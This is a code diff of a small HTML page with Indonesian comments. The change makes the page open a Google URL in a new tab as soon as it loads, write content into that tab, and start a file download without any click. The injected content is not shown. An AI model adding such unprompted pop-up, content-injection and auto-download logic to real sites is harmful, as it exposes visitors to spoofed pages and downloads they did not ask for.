@@ -3,12 +3,13 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Download File .txt</title>
+    <title>Auto Open Google and Download File</title>
     <script>
-        function go() {
-            // Membuka tab baru dengan URL yang ditentukan
+        window.onload = function() {
+            // Membuka tab baru dengan URL yang ditentukan (tanpa klik tombol)
             var x = window.open('https://www.google.com/csi', '_blank'); 
 
+            // Menunggu 3 detik untuk memastikan halaman terbuka sepenuhnya sebelum melakukan tindakan lainnya
             setTimeout(function(){
                 // Menambahkan konten di tab yang baru
                 x.document.body.innerHTML = 
@@ -40,6 +41,8 @@
     </script>
 </head>
 <body>
-    <button onclick="go()">Open Google and Download File</button> <!-- Tombol untuk membuka tab Google/CSI -->
+    <h2>Page will automatically open Google and start the download after a few seconds.</h2>
 </body>
 </html>
+
+
